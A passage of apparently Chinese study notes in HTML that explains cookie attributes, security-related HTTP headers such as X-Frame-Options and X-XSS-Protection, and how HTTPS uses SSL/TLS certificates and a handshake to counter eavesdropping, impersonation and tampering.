&lt;h4 id=&#34;Set-Cookie&#34;&gt;&lt;a href=&#34;#Set-Cookie&#34; class=&#34;headerlink&#34; title=&#34;Set-Cookie&#34;&gt;&lt;/a&gt;Set-Cookie&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;status=enable; expires=Tue, 05 Jul 2011 07:26:31&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Set-Cookie&lt;/strong&gt; 字段的属性&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;属性&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;NAME=VALUE&lt;/td&gt;
&lt;td&gt;赋予 Cookie 的名称和其值（必需项）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;expires=DATE&lt;/td&gt;
&lt;td&gt;Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;path=PATH&lt;/td&gt;
&lt;td&gt;将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;domain=域名&lt;/td&gt;
&lt;td&gt;作为 Cookie 适用对象的域名  （若不指定则默认为创建 Cookie  的服务器的域名）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Secure&lt;/td&gt;
&lt;td&gt;仅在 HTTPS 安全通信时才会发送  Cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HttpOnly&lt;/td&gt;
&lt;td&gt;加以限制，使 Cookie 不能被 JavaScript 脚本访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h6 id=&#34;expires-属性&#34;&gt;&lt;a href=&#34;#expires-属性&#34; class=&#34;headerlink&#34; title=&#34;expires 属性&#34;&gt;&lt;/a&gt;expires 属性&lt;/h6&gt;&lt;p&gt;Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。&lt;/p&gt;
&lt;p&gt;当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session） 时间段内。这通常限于浏览器应用程序被关闭之前。&lt;/p&gt;
&lt;p&gt;另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。&lt;/p&gt;
&lt;h5 id=&#34;path-属性&#34;&gt;&lt;a href=&#34;#path-属性&#34; class=&#34;headerlink&#34; title=&#34;path 属性&#34;&gt;&lt;/a&gt;&lt;strong&gt;path&lt;/strong&gt; 属性&lt;/h5&gt;&lt;p&gt;Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。&lt;/p&gt;
&lt;h5 id=&#34;domain-属性&#34;&gt;&lt;a href=&#34;#domain-属性&#34; class=&#34;headerlink&#34; title=&#34;domain 属性&#34;&gt;&lt;/a&gt;&lt;strong&gt;domain&lt;/strong&gt; 属性&lt;/h5&gt;&lt;p&gt;通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，&lt;a href=&#34;http://www.example.com/&#34;&gt;www.example.com &lt;/a&gt;或www2.example.com 等都可以发送 Cookie。&lt;/p&gt;
&lt;p&gt;因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全&lt;/p&gt;
&lt;h5 id=&#34;secure-属性&#34;&gt;&lt;a href=&#34;#secure-属性&#34; class=&#34;headerlink&#34; title=&#34;secure 属性&#34;&gt;&lt;/a&gt;&lt;strong&gt;secure&lt;/strong&gt; 属性&lt;/h5&gt;&lt;p&gt;Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;name=value; secure&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;HttpOnly-属性&#34;&gt;&lt;a href=&#34;#HttpOnly-属性&#34; class=&#34;headerlink&#34; title=&#34;HttpOnly 属性&#34;&gt;&lt;/a&gt;HttpOnly 属性&lt;/h6&gt;&lt;p&gt;Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;name=value; HttpOnly&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Cookie&#34;&gt;&lt;a href=&#34;#Cookie&#34; class=&#34;headerlink&#34; title=&#34;Cookie&#34;&gt;&lt;/a&gt;Cookie&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;status=enable&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。&lt;/p&gt;
&lt;h3 id=&#34;其他首部字段&#34;&gt;&lt;a href=&#34;#其他首部字段&#34; class=&#34;headerlink&#34; title=&#34;其他首部字段&#34;&gt;&lt;/a&gt;其他首部字段&lt;/h3&gt;&lt;p&gt;HTTP 首部字段是可以自行扩展的。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;X-Frame-Options&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;X-XSS-Protection&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DNT&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P3P&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;X-Frame-Options&#34;&gt;&lt;a href=&#34;#X-Frame-Options&#34; class=&#34;headerlink&#34; title=&#34;X-Frame-Options&#34;&gt;&lt;/a&gt;X-Frame-Options&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;DENY&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。&lt;/p&gt;
&lt;h5 id=&#34;字段&#34;&gt;&lt;a href=&#34;#字段&#34; class=&#34;headerlink&#34; title=&#34;字段&#34;&gt;&lt;/a&gt;字段&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DENY&lt;/strong&gt; ：拒绝&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SAMEORIGIN&lt;/strong&gt; ：仅同源域名下的页面（Top-level-browsing- context）匹配时许可。（比如，当指定 &lt;a href=&#34;http://hackr.jp/sample.html&#34;&gt;http://hackr.jp/sample.html &lt;/a&gt;页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;apache2-conf-的配置实例&#34;&gt;&lt;a href=&#34;#apache2-conf-的配置实例&#34; class=&#34;headerlink&#34; title=&#34;apache2.conf 的配置实例&#34;&gt;&lt;/a&gt;&lt;strong&gt;apache2.conf&lt;/strong&gt; 的配置实例&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&amp;lt;IfModule mod_headers.c&amp;gt;
Header append X-FRAME-OPTIONS &#34;SAMEORIGIN&#34;
&amp;lt;/IfModule&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;X-XSS-Protection&#34;&gt;&lt;a href=&#34;#X-XSS-Protection&#34; class=&#34;headerlink&#34; title=&#34;X-XSS-Protection&#34;&gt;&lt;/a&gt;X-XSS-Protection&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0：将 XSS 过滤设置成无效状态&lt;/li&gt;
&lt;li&gt;1：将 XSS 过滤设置成有效状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;DNT&#34;&gt;&lt;a href=&#34;#DNT&#34; class=&#34;headerlink&#34; title=&#34;DNT&#34;&gt;&lt;/a&gt;DNT&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;DNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0：同意被追踪&lt;/li&gt;
&lt;li&gt;1：拒绝被追踪&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;P3P&#34;&gt;&lt;a href=&#34;#P3P&#34; class=&#34;headerlink&#34; title=&#34;P3P&#34;&gt;&lt;/a&gt;P3P&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;P3P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;CP=&#34;CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。&lt;/p&gt;
&lt;p&gt;要进行 P3P 的设定，需按以下操作步骤进行。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;1&lt;/strong&gt;：创建 P3P 隐私&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;2&lt;/strong&gt;：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;3&lt;/strong&gt;：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中&lt;/p&gt;
&lt;h2 id=&#34;确保-Web-安全的HTTPS&#34;&gt;&lt;a href=&#34;#确保-Web-安全的HTTPS&#34; class=&#34;headerlink&#34; title=&#34;确保 Web 安全的HTTPS&#34;&gt;&lt;/a&gt;确保 &lt;strong&gt;Web&lt;/strong&gt; 安全的HTTPS&lt;/h2&gt;&lt;p&gt;在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS 通信机制可以有效地防止这些问题。&lt;/p&gt;
&lt;h3 id=&#34;HTTP的缺点&#34;&gt;&lt;a href=&#34;#HTTP的缺点&#34; class=&#34;headerlink&#34; title=&#34;HTTP的缺点&#34;&gt;&lt;/a&gt;HTTP的缺点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;通信使用明文（不加密），内容可能会被窃听&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不验证通信方的身份，因此有可能遭遇伪装&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;无法证明报文的完整性，所以有可能已遭篡改&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;通信使用明文（不加密），内容可能会被窃听&#34;&gt;&lt;a href=&#34;#通信使用明文（不加密），内容可能会被窃听&#34; class=&#34;headerlink&#34; title=&#34;通信使用明文（不加密），内容可能会被窃听&#34;&gt;&lt;/a&gt;通信使用明文（不加密），内容可能会被窃听&lt;/h4&gt;&lt;p&gt;由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;TCP/IP&lt;/strong&gt; 是可能被窃听的网络&lt;/p&gt;
&lt;p&gt;互联网上的任何角落都存在通信内容被窃听的风险&lt;/p&gt;
&lt;p&gt;即使加密的处理过的通信任会被监听，只是监听者还需要破解报文信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;加密处理防止被窃听&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;通信的加密&lt;/p&gt;
&lt;p&gt;HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;内容的加密&lt;/p&gt;
&lt;p&gt;HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。&lt;/p&gt;
&lt;p&gt;把HTTP 报文里所含的内容进行加密处理。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/ebf75f3e4a4d5757e3628065a63e4971.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;不验证通信方的身份就可能遭遇伪装&#34;&gt;&lt;a href=&#34;#不验证通信方的身份就可能遭遇伪装&#34; class=&#34;headerlink&#34; title=&#34;不验证通信方的身份就可能遭遇伪装&#34;&gt;&lt;/a&gt;不验证通信方的身份就可能遭遇伪装&lt;/h4&gt;&lt;p&gt;HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。&lt;/p&gt;
&lt;h5 id=&#34;任何人都可发起请求&#34;&gt;&lt;a href=&#34;#任何人都可发起请求&#34; class=&#34;headerlink&#34; title=&#34;任何人都可发起请求&#34;&gt;&lt;/a&gt;任何人都可发起请求&lt;/h5&gt;&lt;p&gt;HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无法判断发出的请求是否到达理想服务器，伪装服务器&lt;/li&gt;
&lt;li&gt;无法判断响应是理想客服端发来的，伪造客服端&lt;/li&gt;
&lt;li&gt;无法判断对方是否具有访问权限&lt;/li&gt;
&lt;li&gt;无法判断是否会发给理想客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;查明对手的证书&#34;&gt;&lt;a href=&#34;#查明对手的证书&#34; class=&#34;headerlink&#34; title=&#34;查明对手的证书&#34;&gt;&lt;/a&gt;查明对手的证书&lt;/h5&gt;&lt;p&gt;虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/5b8c38026530678e13e723170dad0f13.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;无法证明报文完整性，可能已遭篡改&#34;&gt;&lt;a href=&#34;#无法证明报文完整性，可能已遭篡改&#34; class=&#34;headerlink&#34; title=&#34;无法证明报文完整性，可能已遭篡改&#34;&gt;&lt;/a&gt;无法证明报文完整性，可能已遭篡改&lt;/h4&gt;&lt;p&gt;所谓完整性是指信息的准确度。&lt;/p&gt;
&lt;h5 id=&#34;接收到的内容可能有误&#34;&gt;&lt;a href=&#34;#接收到的内容可能有误&#34; class=&#34;headerlink&#34; title=&#34;接收到的内容可能有误&#34;&gt;&lt;/a&gt;接收到的内容可能有误&lt;/h5&gt;&lt;p&gt;在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/6b6927be25adafe4f71d33db42272962.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;如何防止篡改&#34;&gt;&lt;a href=&#34;#如何防止篡改&#34; class=&#34;headerlink&#34; title=&#34;如何防止篡改&#34;&gt;&lt;/a&gt;如何防止篡改&lt;/h5&gt;&lt;p&gt;其中常用的是 MD5 和 SHA-1 等散列值校验的方法， 以及用来确认文件的数字签名方法。这些算法也会被改写。&lt;/p&gt;
&lt;h3 id=&#34;HTTP-加密-认证-完整性保护-HTTPS&#34;&gt;&lt;a href=&#34;#HTTP-加密-认证-完整性保护-HTTPS&#34; class=&#34;headerlink&#34; title=&#34;HTTP+ 加密 + 认证 + 完整性保护**=HTTPS**&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP+&lt;/strong&gt; 加密 &lt;strong&gt;+&lt;/strong&gt; 认证 &lt;strong&gt;+&lt;/strong&gt; 完整性保护**=HTTPS**&lt;/h3&gt;&lt;h4 id=&#34;HTTP-加上加密处理和认证以及完整性保护后即是HTTPS&#34;&gt;&lt;a href=&#34;#HTTP-加上加密处理和认证以及完整性保护后即是HTTPS&#34; class=&#34;headerlink&#34; title=&#34;HTTP 加上加密处理和认证以及完整性保护后即是HTTPS&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP&lt;/strong&gt; 加上加密处理和认证以及完整性保护后即是HTTPS&lt;/h4&gt;&lt;p&gt;把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/e837127d056258e30e3e134a207e6791.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;HTTPS-是身披-SSL-外壳的-HTTP&#34;&gt;&lt;a href=&#34;#HTTPS-是身披-SSL-外壳的-HTTP&#34; class=&#34;headerlink&#34; title=&#34;HTTPS 是身披 SSL 外壳的 HTTP&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTPS&lt;/strong&gt; 是身披 &lt;strong&gt;SSL&lt;/strong&gt; 外壳的 &lt;strong&gt;HTTP&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/140c9e47c4065dfc522e3e412df99331.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;相互交换密钥的公开密钥加密技术&#34;&gt;&lt;a href=&#34;#相互交换密钥的公开密钥加密技术&#34; class=&#34;headerlink&#34; title=&#34;相互交换密钥的公开密钥加密技术&#34;&gt;&lt;/a&gt;相互交换密钥的公开密钥加密技术&lt;/h4&gt;&lt;p&gt;SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;共享密钥加密的困境&lt;/li&gt;
&lt;li&gt;使用两把密钥的公开密钥加密&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTPS&lt;/strong&gt; 采用混合加密机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;证明公开密钥正确性的证书&#34;&gt;&lt;a href=&#34;#证明公开密钥正确性的证书&#34; class=&#34;headerlink&#34; title=&#34;证明公开密钥正确性的证书&#34;&gt;&lt;/a&gt;证明公开密钥正确性的证书&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a60a859278525e0944814a22d2dc2c4a.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;可证明组织真实性的 &lt;strong&gt;EV SSL&lt;/strong&gt; 证书&lt;/p&gt;
&lt;p&gt;证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSL Certificate）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用以确认客户端的客户端证书&lt;/p&gt;
&lt;p&gt;HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;认证机构信誉第一&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;由自认证机构颁发的证书称为自签名证书&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;HTTPS-的安全通信机制&#34;&gt;&lt;a href=&#34;#HTTPS-的安全通信机制&#34; class=&#34;headerlink&#34; title=&#34;HTTPS 的安全通信机制&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTPS&lt;/strong&gt; 的安全通信机制&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/8fd4f672653f4ee626fa9d20a1ed5f5c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;1&lt;/strong&gt;： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;2&lt;/strong&gt;： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;3&lt;/strong&gt;： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;4&lt;/strong&gt;： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;5&lt;/strong&gt;： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;6&lt;/strong&gt;： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;7&lt;/strong&gt;： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;8&lt;/strong&gt;： 服务器同样发送 Change Cipher Spec 报文。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;9&lt;/strong&gt;： 服务器同样发送 Finished 报文。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;10&lt;/strong&gt;： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;11&lt;/strong&gt;： 应用层协议通信，即发送 HTTP 响应。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;12&lt;/strong&gt;： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。&lt;/p&gt;
&lt;p&gt;在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/c4d634280d5777af7ef7eb4b434c7791.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程&lt;/p&gt;
&lt;h4 id=&#34;SSL和TLS&#34;&gt;&lt;a href=&#34;#SSL和TLS&#34; class=&#34;headerlink&#34; title=&#34;SSL和TLS&#34;&gt;&lt;/a&gt;SSL和TLS&lt;/h4&gt;&lt;p&gt;HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。&lt;/p&gt;
&lt;p&gt;SSL目前主导权已转移到IETF，IETF以SSL3.0为基准，后制定了TLS1.0、TLS1.1、TLS1.2。&lt;/p&gt;
&lt;p&gt;当前主流SSL3.0、TLS1.0&lt;/p&gt;
&lt;h5 id=&#34;small-tips&#34;&gt;&lt;a href=&#34;#small-tips&#34; class=&#34;headerlink&#34; title=&#34;small_tips&#34;&gt;&lt;/a&gt;small_tips&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HTTPS&lt;/strong&gt; 比 &lt;strong&gt;HTTP&lt;/strong&gt; 要慢 &lt;strong&gt;2&lt;/strong&gt; 到 &lt;strong&gt;100&lt;/strong&gt; 倍&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;确认访问用户身份的认证&#34;&gt;&lt;a href=&#34;#确认访问用户身份的认证&#34; class=&#34;headerlink&#34; title=&#34;确认访问用户身份的认证&#34;&gt;&lt;/a&gt;确认访问用户身份的认证&lt;/h2&gt;&lt;p&gt;某些 Web 页面只想让特定的人浏览&lt;/p&gt;
